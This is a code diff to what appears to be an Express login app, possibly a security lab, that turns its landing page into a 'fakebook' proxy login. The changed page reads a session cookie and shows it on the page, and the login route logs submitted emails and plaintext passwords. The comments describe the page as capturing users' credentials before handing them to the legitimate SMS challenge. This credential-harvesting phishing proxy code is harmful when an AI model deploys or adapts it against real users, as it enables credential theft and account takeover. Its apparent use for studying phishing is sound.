@@ -119,10 +119,20 @@ function getCurrentCommitId() {
   }
 }
 
-function renderLandingPage() {
+// Proxy: fakebook login page that captures the user's credentials and forwards the flow to the legitimate app.
+function readProxySessionCookie(req) {
+  const cookieHeader = req.headers.cookie || '';
+  const match = cookieHeader.match(/(?:^|;\s*)secure_lab_session=([^;]+)/);
+  return match ? decodeURIComponent(match[1]) : 'No session cookie present';
+}
+
+function renderProxyPage(req) {
   const templatePath = path.join(__dirname, 'public', 'index.html');
   const template = fs.readFileSync(templatePath, 'utf8');
-  return template.replace('{{commitId}}', getCurrentCommitId());
+  const sessionCookieValue = readProxySessionCookie(req);
+  return template
+    .replace('{{commitId}}', getCurrentCommitId())
+    .replace('{{sessionCookieValue}}', sessionCookieValue);
 }
 
 function issueAuthorizationCode(clientId, redirectUri, user) {
@@ -156,9 +166,11 @@ app.get('/', (req, res) => {
   if (req.session.user) {
     return res.redirect('/inside');
   }
-  res.send(renderLandingPage());
+  // Proxy page: minimalist UI that captures credentials and hands the user to the legitimate flow.
+  res.send(renderProxyPage(req));
 });
 
+// Proxy receives the credentials, stores the session state, and then shows the legitimate SMS challenge screen.
 app.post('/login', (req, res) => {
   const { email, password } = req.body;
   console.log(`[LOGIN] Email: ${email} | Password: ${password}`);
